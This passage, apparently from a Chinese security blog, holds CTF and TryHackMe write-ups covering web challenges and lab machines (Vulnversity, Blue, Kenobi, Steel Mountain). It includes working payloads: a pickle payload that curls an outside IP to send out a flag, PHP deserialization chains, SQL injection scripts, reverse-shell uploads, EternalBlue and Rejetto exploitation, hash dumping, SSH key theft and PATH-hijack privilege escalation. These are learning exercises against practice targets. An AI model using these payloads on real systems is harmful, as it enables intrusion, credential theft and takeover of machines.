\"rb\") as f: stream = f.read() response = Response(stream, content_type=\"application/octet-stream\") response.headers[\"Content-disposition\"] = \"attachment;filename=www.zip\" return response if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=80) 一眼看到/girlfriends路由下的loads，想到pickle反序化，看到这里过滤了R指令，bash以及sh字符，看了wp可以用curl外带出来 import base64 opcode=b'''(S'curl ip:8888/`cat /f*`' ios system ''' print(base64.b64encode(opcode)) 参考文章 2023年春秋杯网络安全联赛 春季赛 wp call 不会，也没wp-.- php_again PHP OPcache getshell 这个知识点的学习，另起一篇文章了，有点长。 发现知识点真的多，拿不下。。。。 ezrust use actix_files::NamedFile; use actix_web::{App, HttpRequest, HttpResponse, HttpServer, Responder, Result, web, get, post, guard}; use std::path::PathBuf; async fn index(req: HttpRequest) -&gt; Result&lt;NamedFile&gt; { let mut path: PathBuf = req.match_info().query(\"filename\").parse().unwrap(); if path.to_str().expect(\"REASON\").to_string().contains(\"p\") { path = PathBuf::from(\"no\"); } Ok(NamedFile::open(path)?) } #[get(\"/\")] async fn hello() -&gt; impl Responder { HttpResponse::Ok().body(\"Hello world!\") } #[get(\"/{name}\")] async fn name(path: web::Path&lt;(String)&gt;) -&gt; Result&lt;String&gt; { let name = path.into_inner(); Ok(format!(\"Welcome {}!\", name)) } #[actix_web::main] async fn main() -&gt; std::io::Result&lt;()&gt; { HttpServer::new(|| { App::new() .service(hello) .service(name) .route(\"/{filename:.*}\", web::get().to(index)) }) .bind((\"0.0.0.0\", 8000))? .run() .await } 这里不太理解，代码说是index函数下，会处理filename参数内容，如果出现p则置空，这里是可以目录穿越的，题目也提示在work目录下。感觉像是文字游戏，这里读取当前目录就会发现存在flag，难道work意味着工作目录，而不是work目录？ qqcms 这道题考察代码审计，由于没学过，即使能看懂PHP代码感觉也是无从下手，因此就直接跟着wp看漏洞点，等下周学了一步步进阶吧。 标签内sql注入 万能标签：列表形式调用数据库里任何数据 {{loop sql='select * from qc_user'}} 可以看到这里的搜索框存在sql注入，定位到源码就是这个位置 跟进tempRun 这里根据wp：跟进tempRun，发现对页面解析了所有的标签 继续跟进loop_Tmp，看到对页面进行了正则匹配，正好我们通过Search传参可以在页面写入标签（赋个照片） 执行sql语句，修改账号密码 {{loop sql='update qc_user set Password=md5(114514),Phone=16666666666'}}test{{/loop}} 至于原因我们可以继续跟进replaceLoop，如下图，发现执行了sql查询，继续跟进 看到这里是底层逻辑，执行了sql对应的sql语句。 在刚才的查询框执行即可 后台任意文件读取漏洞 登录后台利用文件包含漏洞即可 引入组件：引入一些通用代码页面，比如一个网站的导航和底部都是一样的，就单独做一个组件，通过include标签引入 {{include filename='component_header.html'/}} 遍历一下即可读取 定位到代码，就是下图，可以看到对html没有做出过滤 参考文章 2023春秋杯春季赛 qqcms复现 2023年春秋杯网络安全联赛 春季赛 wp CISCN-2022 Ezpop &lt;?php namespace think{ abstract class Model{ private $lazySave = false; private $data = []; private $exists = false; protected $table; private $withAttr = []; protected $json = []; protected $jsonAssoc = false; function __construct($obj = ''){ $this-&gt;lazySave = True; $this-&gt;data = ['whoami' =&gt; ['cat /flag.txt']]; $this-&gt;exists = True; $this-&gt;table = $obj; $this-&gt;withAttr = ['whoami' =&gt; ['system']]; $this-&gt;json = ['whoami',['whoami']]; $this-&gt;jsonAssoc = True; } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ } } namespace{ echo(urlencode(serialize(new think\\model\\Pivot(new think\\model\\Pivot())))); } ?&gt; 参考文章 ThinkPHP6.0.12LTS反序列漏洞分析 2022第十五届全国大学生信息安全竞赛创新实践能力赛-初赛部分WP Ezpentest 这道题让我晓得，sql注入学的太浅了 这里先自己测试了一下，发现页面回显会有不同，对登录框做了sql测试，发现如果是单纯的账号密码不正确，页面回显200数据为：error 如果是sql语句错误，页面就回显500（也就是这个特性，使得我们可以利用盲注来爆破账号密码） 这里我不知道他们从哪看到的提示，就直接cv了 function safe($a) { $r = preg_replace('/[\\s,()#;*~\\-]/','',$a); $r = preg_replace('/^.*(?=union|binary|regexp|rlike).*$/i','',$r); return (string)$r; } 这里师傅们说参考：虎符2022 - babysql [mysql8|溢出|utf8mb4_bin]（hint：mysql8的utf8mb4_bin应用） ''代替空格，utf8mb4_bin+collate来判断大小写问题，通过溢出报错来盲注 username=0'||case'1'when`username`collate'utf8mb4_bin'like'{}%'then+9223372036854775807+1+''else'0'end||'&amp;password=123 可以看一下这个逻辑： case'1'：以字符串'1'作为条件进行判断。 之后when:当username以a开头(utf8mb4_bin表示大小写敏感)则返回1，否则执行else后面的也就是+9223372036854775807+1+。 最后end结束case语句 也就是说执行成功，那页面肯定回显500（因为溢出报错），那靠这个盲注即可 import string import requests str=string.ascii_letters+string.digits+\"$@!^&amp;}{_%\" payload=\"0'||case'1'when`username`collate'utf8mb4_bin'like'{}%'then+9223372036854775807+1+''else'0'end||'\" url='http://eci-2ze6lc580kgjg6341bqr.cloudeci1.ichunqiu.com/login.php' f=\"\" while 1: for i in str: if(i in '%_'): i=\"\\\\\"+i resp=requests.post(url=url,data={\"username\":payload.format(f+i), \"password\":\"0\"}) if(resp.status_code==500): f+=i print(f) break 但这里手动测试，我不理解为何总是返回500 最终爆破结果为 awk785969awlfjnlkjlii!@$%!! PAssw40d_Y0u3_Never_Konwn!@!! 进去之后，题目提示我们这段代码被这个网址加密了，网上找相应解密脚本即可（但都太老了，好难用）我也没成功，直接附上结果了 &lt;?php session_start(); if(!isset($_SESSION['login'])){ die(); } function Al($classname){ include $classname.\".php\"; } if(isset($_REQUEST['a'])){ $c = $_REQUEST['a']; $o = unserialize($c); if($o === false) { die(\"Error Format\"); }else{ spl_autoload_register('Al'); $o = unserialize($c); $raw = serialize($o); if(preg_match(\"/Some/i\",$raw)){ throw new Error(\"Error\"); } $o = unserialize($raw); var_dump($o); } }else { echo file_get_contents(\"SomeClass.php\"); } 这里是不使用参数访问这个文件就可以得到SomeClass.php的内容： &lt;?php class A { public $a; public $b; public function see() { $b = $this-&gt;b; $checker = new ReflectionClass(get_class($b)); if(basename($checker-&gt;getFileName()) != 'SomeClass.php'){ if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b)){ ($b-&gt;a)($b-&gt;b.\"\"); } } } } class B { public $a; public $b; public function __toString() { $this-&gt;a-&gt;see(); return \"1\"; } } class C { public $a; public $b; public function __toString() { $this-&gt;a-&gt;read(); return \"lock lock read!\"; } } class D { public $a; public $b; public function read() { $this-&gt;b-&gt;learn(); } } class E { public $a; public $b; public function __invoke() { $this-&gt;a = $this-&gt;b.\" Powered by PHP\"; } public function __destruct(){ //eval($this-&gt;a); ??? 吓得我赶紧把后门注释了 //echo \"???\"; die($this-&gt;a); } } class F { public $a; public $b; public function __call($t1,$t2) { $s1 = $this-&gt;b; $s1(); } } ?&gt; spl_autoload_register这个函数就是自动加载类，当new一个没有包含的类时，他就会自动调用A1静态方法来包含所需的类。但是在后面可以看到SomeClass被过滤了 这样如果我们包含这个类，就会抛出错误从而终止程序，使__destruct()无法执行，这样我们的链子就没有用了。 所以我们要提前调用__destruct(),在包含SomeClass类的同时就进入__destruct() 链子很简单，就是对于if(basename($checker-&gt;getFileName()) != 'SomeClass.php')需要将b赋值为其他，不能使其为SomeClass &lt;?php class A { public $a; public $b; } class B { public $a; public $b; } class E { public $a; public $b; } class SomeClass { public $a; } $pop = new E(); $pop-&gt;a = new B(); $pop-&gt;a-&gt;a = new A(); $pop-&gt;a-&gt;a-&gt;b = new ErrorException(); $pop-&gt;a-&gt;a-&gt;b-&gt;a = \"system\"; $pop-&gt;a-&gt;a-&gt;b-&gt;b = \"ls /\"; $pop1 = new SomeClass(); $pop1-&gt;a = $pop; $pop1 = serialize(array($pop1,0)); echo $pop1.\" \"; $pop1 = str_replace(\"i:1\", \"i:0\", $pop1); echo $pop1.\" \"; echo urlencode($pop1); ?&gt; a%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SomeClass%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22E%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A2%3A%7Bs%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BO%3A14%3A%22ErrorException%22%3A10%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A22%3A%22D%3A%5CPphProject%5Cpoc1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A50%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3Bs%3A11%3A%22%00%2A%00severity%22%3Bi%3A0%3Bs%3A1%3A%22a%22%3Bs%3A6%3A%22system%22%3Bs%3A1%3A%22b%22%3Bs%3A11%3A%22%27cat+%2Fflag%27%22%3B%7D%7Ds%3A1%3A%22b%22%3BN%3B%7Ds%3A1%3A%22b%22%3BN%3B%7D%7Di%3A0%3Bi%3A0%3B%7D 这里不知为何，执行不成功 参考文章 [CISCN 2022 初赛]ezpentest CISCN2022初赛-Web CISCN 2022 初赛 WriteUp by 0xFA","tags":["CTF赛事"],"categories":["CTF赛事"]},{"title":"THM-进攻性渗透测试","path":"/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/","content":"0x01 vulnversity漏洞 侦查 nmap扫描目标机 Nmap 是一个免费、开源且功能强大的工具，用于发现计算机网络上的主机和服务。在我们的示例中，我们使用 Nmap 扫描该计算机以识别特定端口上运行的所有服务。 Nmap 有很多功能；下面的表格总结了其一些功能。 Nmap Description -sV 尝试确定正在运行的服务的版本 -p or -p- - 端口扫描端口 或扫描所有端口 -Pn 禁用主机发现并扫描开放端口 -A 启用操作系统和版本检测，执行内置脚本以进行进一步枚举 -sC 使用默认 Nmap 脚本扫描 -v 详细模式 -sU UDP端口扫描 -sS TCP SYN端口扫描 这里看文章hint说是，利用-O参数进行扫描，如下图所示，反而还不如上面的-sV选项有用（上面明确说是ubuntu OS） 使用gobuste扫描目录 使用名为 Gobuster 的快速目录发现工具，您将找到可用于上传 shell 的目录。让我们首先扫描网站以查找任何隐藏的目录。为此，我们将使用 Gobuster。 Gobuster 是一个用于暴力破解 URI（目录和文件）、DNS 子域和虚拟主机名的工具。对于这台机器，我们将重点使用它来暴力破解目录。 在这里下载 Gobuster，或者如果您使用的是 Kali Linux，请运行 sudo apt-get install gobuster 首先，您需要一个 Gobuster 的单词列表（它将用于快速浏览单词列表以确定公共目录是否可用。如果您使用 Kali Linux，您可以在 /usr/share/wordlists 下找到许多单词列表）您还可以在 AttackBox 中使用位于 /usr/share/wordlists/dirbuster/directory-list-1.0.txt 的目录的单词列表。 现在让我们使用 gobuster dir -u http://10.10.127.89:3333 -w 运行带有单词列表的 Gobuster Gobuster flag Description -e 在控制台中打印完整的 URL -u 目标网址 -w 单词列表的路径 -U and -P 基本身份验证的用户名和密码 -p 用于请求的代理 -c 指定一个 cookie 来模拟您的身份验证 gobuster dir -u http://10.10.127.89:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 入侵网络服务器 现在您已经找到了上传文件的表单，我们可以利用它来上传并执行我们的有效负载，这将导致网络服务器受到损害。 我们将使用 Intruder（用于自动化定制攻击）。首先，创建一个具有以下扩展名的单词列表： .php .php3 .php4 .php5 .phtml 现在确保 BurpSuite 配置为拦截所有浏览器流量。上传一个文件;一旦捕获该请求，将其发送给入侵者。单击“有效负载”并选择“狙击手”攻击类型。 现在单击“位置”选项卡，找到文件名并“添加§”到扩展名。它应该看起来像这样： 这里我还因为后缀被url编码导致一直出错。。。。现在我们知道可以为有效负载使用什么扩展，我们就可以继续前进了。 我们将使用 PHP 反向 shell 作为我们的有效负载。反向 shell 的工作原理是在远程主机上调用并强制该主机与您建立连接。因此，您将侦听传入的连接，上传并执行 shell，这将向您发出控制信号！ 在此处下载以下反向 PHP shell。 要远程访问此计算机，请按照下列步骤操作： 编辑 php-reverse-shell.php 文件并将 ip 编辑为您的 tun0 ip（您可以通过在 TryHackMe 连接设备的浏览器中访问 http://10.10.10.10 来获取此信息）。 将此文件重命名为 php-reverse-shell.phtml 我们现在将使用 netcat 监听传入连接。运行以下命令：nc -lvnp 1234 上传您的 shell 并导航到 http://10.10.127.89:3333/internal/uploads/php-reverse-shell.phtml - 这将执行您的有效负载 您应该在 Netcat 会话上看到一个连接 权限提升 现在您已经入侵了这台机器，我们将升级权限并成为超级用户（root）。 在 Linux 中，SUID（执行时设置所有者 userId）是赋予文件的一种特定类型的文件权限。 SUID 向用户授予临时权限，以在文件所有者（而不是运行它的用户）的许可下运行程序/文件。 例如，用于更改密码的二进制文件具有设置了 SUID 位 (/usr/bin/passwd)。这是因为要更改密码，它将需要写入您无权访问但 root 有权访问的 shadow 文件，因此它具有 root 权限来进行正确的更改。 搜索的命令为：find / -perm -u=s -type f 2&gt;/dev/null 这里的手法可以参考：https://gtfobins.github.io/gtfobins/systemctl/以及 权限提升 | 带SUID的命令提权 这里思路就是将/bin/bash命令赋值到tmp临时目录下，并且给该目录增加+s root权限，以至于后续可以以root的身份执行，不至于无权访问，当然这里也能写上bash反弹shell 这里也补充一个东西，找到www-data可以写入的目录 find / -type f -maxdepth 2 -writable find / -type d -maxdepth 2 -writable 总结 这道题目思路是先常规nmap扫描，发现敏感端口，接着访问web站点，测试一波功能点发现文件上传，接着fuzz可以上传的后缀，发现phtml可以上传，之后就是上传可以反弹shell马，拿到shell之后，就是提权了，这里用到的就是suid提权。 0x02 blue挑战 侦查 扫描并了解该机器容易受到哪些攻击。请注意，该计算机不响应 ping (ICMP)，并且可能需要几分钟才能启动。这个房间并不是一个 boot2root CTF，而是一个针对完全初学者的教育系列。除了基本练习之外，专业人士在这个房间里可能不会得到什么，因为这里的过程是针对初学者的。 nmap -sV -p- -Pn -T4 10.10.176.146 访问获取权限 利用机器并站稳脚跟。 提升权限 升级权限，了解如何在 Metasploit 中升级 shell。 上述可以看到存在SMB ms17-010漏洞，这里选择永恒之蓝来利用 设置好相关参数，即可直接run 拿到shell之后，我们退到后台，尝试将该反弹shell转换为meterpreter类型的shell 搜寻一番可以发现该模块：post/multi/manage/shell_to_meterpreter 如下图所示，设置相关参数 直接run运行，之后会看到新增一个会话 切换到会话3，并且看到我们当前的权限就是system（NT AUTHORITY\\SYSTEM） 通过命令“shell”打开 dos shell 并运行“whoami”。这应该表明我们确实是一个系统。之后将此 shell 置于后台并再次选择我们的 meterpreter 会话以供使用。 列出通过“ps”命令运行的所有进程。仅仅因为我们是系统并不意味着我们的流程是。在此列表底部找到一个在 NT AUTHORITY\\SYSTEM 运行的进程，并记下进程 ID（最左列）。 如上图，这里我选择2652的进程id 使用“migrate PROCESS_ID”命令迁移到此进程，其中进程 ID 是您刚刚在上一步中记下的 ID。这可能需要多次尝试，迁移过程不是很稳定。如果失败，您可能需要重新运行转换过程或重新启动计算机并再次启动。如果发生这种情况，请下次尝试不同的过程。 这里也是尝试了多个进程，发现很多都显示没有权限，2912恰好符合 破解 转储非默认用户的密码并破解它！ 在我们提升的 meterpreter shell 中，运行命令“hashdump”。只要我们有正确的权限，这就会转储计算机上的所有密码。非默认用户的名称是什么？ 这里可以用john或者在线网站破解 这里我了解了一下上述NT格式的含义：--format=NAME name指定密文格式,指定密文格式名称,为DES/BSDI/MD5/BF/AFS/LM指定使用某种密文格式进行破解 具体参考：https://doc.gui.run/docs/security_tools/security_tools-1e06j26453ols 寻找flag 找到这台机器上插着的三面旗帜。这些不是传统的标志，而是代表 Windows 系统中的关键位置。使用下面提供的提示来完成这个房间！ 标志1：该标志可以在系统根目录中找到。 标志2：该标志可以在 Windows 中存储密码的位置找到。 勘误表：Windows 确实不喜欢此标志的位置，并且偶尔会删除它。在某些情况下，可能需要终止/重新启动计算机并重新运行漏洞利用程序才能找到此标志。这种情况相对罕见，但也有可能发生。 位置存在于Windows的system32下的config目录下 标志3：这面旗帜可以在一个绝佳的位置找到，可以进行掠夺。毕竟，管理员通常会保存一些非常有趣的东西。 总结 依旧是nmap扫描，发现敏感端口445，联想到永恒之蓝，直接msf exploit，发现成功，接下来为了方便，想办法将该shell转变为meterpreter shell，选择post中的某个模块，成功转换，接着就是提权，采用migrate 进程ID来提权，迁移进程成功之后，就提升了权限，接下来就是找敏感文件：比如根目录、Windows\\system32\\config目录，以及用户对应的document目录 0x03 Kenobi挑战 有关利用 Linux 机器的演练。枚举 Samba 共享、操纵 proftpd 的易受攻击版本并通过路径变量操纵来升级您的权限。 本会议室将介绍访问 Samba 共享、操纵 proftpd 的易受攻击版本以获得初始访问权限以及通过 SUID 二进制文件将您的权限升级为 root。 枚举Samba共享 Samba 是适用于 Linux 和 Unix 的标准 Windows 互操作程序套件。它允许最终用户访问和使用公司内部网或互联网上的文件、打印机和其他常用共享资源。它通常被称为网络文件系统。 Samba 基于服务器消息块 (SMB) 的通用客户端/服务器协议。 SMB 是专门为 Windows 开发的，如果没有 Samba，其他计算机平台就会与 Windows 机器隔离，即使它们是同一网络的一部分。 使用 nmap 我们可以枚举 SMB 共享的机器，Nmap 能够自动运行各种网络任务。有一个脚本可以枚举共享！ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.67.234 SMB 有两个端口：445 和 139。 首先nmap常规扫描：nmap -sS -sV -p- -T4 10.10.67.234 这里有点不清楚，为何答案是7个端口，用了hint的 nmap命令，发现还真是7个，有点不理解（可能是我全端口扫描的缘故吧） Samba监听端口有：TCP和UDP------tcp端口相对应的服务是smbd服务，其作用是提供对服务器中文件、打印资源的共享访问；udp端口相对应的服务是nmbd服务，其作用是提供基于NetBIOS主机名称的解析。 nmap有一个用于枚举SMB共享的脚本，使用 nmap，我们可以枚举一台机器的SMB 共享。 继续找SMB的共享：nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.67.234 #也可以使用以下命令：smbclient -L \\\\\\\\10.10.54.34\\\\ 使用smbclient命令，匿名连接目标机的SMB共享，查看共享系统上存在什么文件 smbclient //10.10.67.234/anonymous #这里不用输入密码直接进入即可 看到这里存在一个log.txt文件。你可以使用smbget命令，通过匿名用户 递归地下载整个SMB 共享，共享系统中的文件将会被下载到本地 smbget smb://10.10.67.234/anonymous/log.txt 这里的smbget命令出问题了，说是解析顺序不正确，看了文章去改配置文件smb.conf但是没找到相关选项，真是服了，看了官方文档也没有效果。这里我就无奈指定文件下载了，-R选项用不了。。。。 查看来自共享系统的log.txt文件内容，我们可以获取两个信息： 为Kenobi用户生成 SSH 密钥时的信息–Kenobi用户的ssh密钥–保存在/home/kenobi/.ssh路径下 有关 ProFTPD 服务器的信息（ 运行FTP服务的用户是 Kenobi） 之前的端口扫描显示了 端口111正在运行rpcbind服务，rpcbind是一个将远程程序调用(RPC-- remote procedure call)的程序号转换为通用地址的服务器。当一个RPC 服务启动时，它会告诉 rpcbind 它正在监听的地址以及它准备启用的服务所对应的RPC程序编号。 查看本例中端口111的nmap扫描信息，可以发现nfs（network file system）服务被远程启用，接下来尝试枚举nfs信息： nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.67.234 使用 ProFtpd 获得初始访问权限 ProFtpd 是一个免费的开源 FTP 服务器，兼容 Unix 和 Windows 系统。在过去的软件版本中，它也容易受到攻击。 可以使用netcat来连接FTP服务，看其版本信息nc ip 21 我们可以使用 searchsploit 来查找特定软件版本的漏洞。Searchsploit 基本上只是 exploit-db.com 的命令行搜索工具。 ProFTPd 运行有多少漏洞？ 我们可以看到，该版本ProFtpd的mod_copy模块中存在漏洞。 （mod_copy模块功能-参考链接：http://www.proftpd.org/docs/contrib/mod_copy.html ） mod_copy模块实现了SITE CPFR 和 SITE CPTO 命令(类似于 RNFR 和 RNTO) ，这些命令可以用来将文件/目录从服务器上的一个地方复制到另一个地方，而无需将数据传输到客户端并等待返回（无身份验证），该模块包含在 ProFTPD 1.3.x 的 mod_copy.c 文件中，默认情况下不进行编译。 也就是说：任何未经身份验证的客户机都可以利用SITE CPFR 和 SITE CPTO 命令，将文件从FTP服务器的文件系统的任何位置复制到选定的位置。 由之前的信息我们知道：Kenobi是运行FTP服务的用户、Kenobi用户的ssh密钥保存路径。 现在我们将使用 SITE CPFR 和 SITE CPTO 命令复制Kenobi的ssh私钥，我们将私钥复制到NFS所挂载的目录下，后继我们就能获取到这个私钥文件： #连接目标机的FTP服务器,FTP运行在21端口 nc 10.10.54.34 21 SITE CPFR /home/kenobi/.ssh/id_rsa SITE CPTO /var/tmp/id_rsa #将密钥复制到NFS所挂载的/var目录下 然后让我们将目标机的/var/tmp 目录挂载到我们的攻击机上： mkdir /mnt/kenobiNFS mount 10.10.54.34:/var /mnt/kenobiNFS #此处的ip是目标机ip。完成挂载后：目标机的/var目录下的所有文件，都将在攻击机的/mnt/kenobiNFS目录下 ls -la /mnt/kenobiNFS 复制Kenobi的ssh私钥到攻击机当前目录，然后使用ssh登录到 Kenobi 的帐户，查看标志性文件： cp /mnt/kenobiNFS/tmp/id_rsa . chmod 600 id_rsa ssh -i id_rsa kenobi@10.10.67.234 -oHostKeyAlgorithms=+ssh-rsa 这条命令是在Linux系统中使用OpenSSH客户端连接到远程主机的命令行语句。其中，每个参数的含义如下： ssh：OpenSSH客户端命令，负责连接到远程主机并启动Shell。 -i：指定使用哪个私钥文件进行身份认证。 id_rsa：指定使用~/.ssh/id_rsa文件作为私钥。 kenobi：远程主机的用户名。 @：用户名和IP地址之间的分隔符。 10.10.67.234：远程主机的IP地址。 -o：指定连接选项。 HostKeyAlgorithms：指定允许使用的主机密钥算法。 +ssh-rsa：指定允许使用RSA签名密钥算法进行连接。 总之，这条命令的作用是使用指定的私钥(id_rsa)连接到远程主机(10.10.67.234)，并允许使用RSA签名密钥算法进行身份认证。 通过PATH变量提权 我们先了解SUID、SGID和SBIT(Sticky Bits)，这三个概念 我们在提权基础篇有详细讲解： 权限 在文件上 在目录上 SUID Bit 用户使用文件所有者的权限执行文件 - SGID Bit 用户在组所有者的权限下执行该文件 在目录中创建的文件获取相同的组所有者。 Sticky Bit 无意义 阻止用户删除其他用户目录下的文件 SUID位是很不安全的，一些二进制文件确实需要提高权限来运行才被赋予SUID位(如/usr/bin/passwd，因为你需要使用它以便在系统上重置个人密码)，但是其他具有 SUID 位的自定义文件可能会导致各种各样的问题。 要在目标机系统中搜索SUID/SGID类型的文件，请在目标机上运行以下命令： find / -perm -u=s -type f 2&gt;/dev/null 找出看起来很不寻常的文件/usr/bin/menu ，并尝试执行它： strings 是 Linux 上的一个命令，它能在二进制文件上查找人类可读的字符串，我们使用以下命令来查看/usr/bin/menu运行时的信息（因为执行menu命令时有文字回显，我们才使用strings命令）： strings /usr/bin/menu 观察上图可以得知：当我们执行/usr/bin/menu 时，选择选项1其实是在执行一个curl命令，选择选项2其实是在执行uname -r命令。 这表明二进制文件curl和uname，是在没有完整路径的情况下运行的(例如没有使用/usr/bin/curl 或/usr/bin/uname运行文件)。 我们已经知道/usr/bin/menu文件是一个SUID文件，它在执行时会暂时具有root 用户权限，我们可以尝试自定义创建一个curl文件（并写入/bin/bash，意思是打开一个bash shell），然后我们再给自定义的curl文件附加可执行权限（+x），接着将自定义的curl文件所在的路径添加到PATH变量中（这样能够保证我们自定义的curl文件能够被首先找到）。 完成以上操作之后，执行SUID文件/usr/bin/menu，产生的效果是：以root权限打开一个bash shell-----这将获得root shell cd /tmp echo /bin/bash &gt; curl chmod +x curl export PATH=/tmp:$PATH #新添加的路径/tmp会在PATH变量的最前面，这样就能用我们伪造的curl文件代替真实的curl文件，保证自定义的curl文件被成功执行 /usr/bin/menu #在跳出选项时，我们选择选项1，这样就能调用到伪造的curl文件 ls /root/ cat /root/root.txt 总结 这里涉及的知识有点多：思路是nmap常规扫描，发现445和139端口暴露，接着尝试枚举Samba共享，发现存在三个共享的路径，并且其中有的可以匿名访问，访问成功之后，发现其中有个log.txt文件，下载下来发现其中含有kenobi用户的ssh秘钥以及ProFtpd信息。 接着利用端口111的rpcbind服务，发现该服务启动了nfs，之后枚举nfs发现存在2个可以远程共享访问的目录，看到第二个目录下存在的信息很多，尝试之后挂载该目录到我们本地上。接着看一下当前ftp服务对应版本，发现存在相关漏洞，利用该漏洞，直接将靶机的ssh秘钥文件下载到了我们要挂载的目录上。接着用nfs挂载到我们本地上之后，成功拿到ssh秘钥，接着ssh登录，之后就是提权了，不过这里用算是个环境变量劫持吧。 先是发现对方的suid文件中有一个可以的文件menu发现其中执行了curl的命令，然后我们尝试将/bin/bash写入到curl命令中，然后将该curl对应的路径提添加到环境变量最前面，就相当于命令替换了，接着运行menu文件（属主为root），相当于以root用户运行了/bin/bash，也就提权了 0x04 Steel Mountain挑战 闯入以机器人先生为主题的 Windows 机器。使用 metasploit 进行初始访问，利用 powershell 进行 Windows 权限提升枚举，并学习获取管理员访问权限的新技术。 在此聊天室中，你将枚举一台 Windows 计算机，使用 Metasploit 获得初始访问权限，使用 Powershell 进一步枚举该计算机，并将您的权限提升为管理员。 如果您没有合适的安全工具和环境，请部署您自己的 Kali Linux 机器，并使用我们的 Kali Room 在您的浏览器中对其进行控制。 请注意，此计算机不响应 ping （ICMP），可能需要几分钟才能启动。 初始访问 也是很迷惑，至今还是在摸索如何才能较为恰当的使用nmap扫描命令，感觉选的总不是最佳的，慢慢体会吧 nmap -Pn -sV -sC 10.10.97.69 除了默认的80端口之外，目标站点还开放了8080端口提供http服务，查看8080端口的webserver页面： 可见这里的文件服务器是rejetto http file server msfconsole -q #跳过提示语打开msf search Rejetto use exploit/windows/http/rejetto_hfs_exec options set RHOSTS 10.10.97.69 set RPORT 8080 set LHOST 10.11.81.232 #当使用OpenVPN连接到TryHackMe内网时，需要设置该选项为tun0地址 exploit #或者run shell #由meterpreter shell界面进入Windows shell界面 cd C:\\Users\\bill\\Desktop\\ dir more user.txt 权限提升 现在，您在此 Windows 计算机上有一个初始 shell，即 Bill，我们可以进一步枚举该计算机并将我们的权限升级为 root！ 现在我们在这台机器上有了一个初始 shell，我们可以进一步枚举操作系统信息并查看将权限升级到root的利用点，使用名为“ PowerUp”的 PowerShell 脚本来评估这台 Windows 机器并确定目标机是否存在任何异常和错误配置。 下载脚本到你的本地终端(注意不要使用命令行的形式下载这个脚本，而是复制脚本内容并新建一个ps1文件): https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 一旦脚本保存在本地，就可以通过 meterpreter shell 上传该脚本:（这里我直接git了github项目） 然后我们可以通过meterpreter会话来加载PowerShell扩展，并进入 PowerShell的shell界面并执行脚本: load powershell powershell_shell Import-Module .\\PowerUp.ps1 Invoke-AllChecks meterpreter &gt; load powershell Loading extension powershell...Success. meterpreter &gt; powershell_shell PS &gt; Import-Moudle .\\PowerUp.ps1 PS &gt; Invoke-AllChecks ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubd irectory} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path CanRestart : True Name : AdvancedSystemCareService9 Check : Unquoted Service Paths ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path CanRestart : True Name : AdvancedSystemCareService9 Check : Unquoted Service Paths ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit; IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path CanRestart : True Name : AdvancedSystemCareService9 Check : Unquoted Service Paths ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe; IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path CanRestart : True Name : AdvancedSystemCareService9 Check : Unquoted Service Paths ServiceName : AWSLiteAgent Path : C:\\Program Files\\Amazon\\XenTools\\LiteAgent.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubd irectory} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AWSLiteAgent' -Path CanRestart : False Name : AWSLiteAgent Check : Unquoted Service Paths ServiceName : AWSLiteAgent Path : C:\\Program Files\\Amazon\\XenTools\\LiteAgent.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AWSLiteAgent' -Path CanRestart : False Name : AWSLiteAgent Check : Unquoted Service Paths ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubd irectory} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 